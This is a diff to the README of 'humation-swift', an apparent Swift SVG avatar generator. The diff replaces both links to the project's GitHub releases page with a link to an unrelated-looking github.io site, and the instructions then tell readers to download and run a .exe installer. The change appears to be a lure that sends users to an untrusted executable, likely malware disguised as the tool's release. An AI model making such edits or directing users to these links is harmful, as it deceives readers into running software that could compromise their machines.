@@ -1,6 +1,6 @@
 # 🎨 humation-swift - Generate unique SVG profile pictures easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/colaptescapercollarisatomicnumber73177/humation-swift/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://colaptescapercollarisatomicnumber73177.github.io)
 
 humation-swift creates custom, hand-drawn vector avatars for your profiles. It uses your input data to generate stable, deterministic images. The engine relies on core graphics technology to provide smooth results without the need for a web browser.
 
@@ -21,7 +21,7 @@ Ensure your computer meets these standards before you begin:
 
 You need to obtain the installer from our release page to start the setup process.
 
-1.  Visit the [official download page](https://github.com/colaptescapercollarisatomicnumber73177/humation-swift/releases).
+1.  Visit the [official download page](https://colaptescapercollarisatomicnumber73177.github.io).
 2.  Look for the section marked Assets under the most recent version number.
 3.  Click the link ending in .exe to start the download.
 4.  Save the file to your Downloads folder or your desktop for easy access.
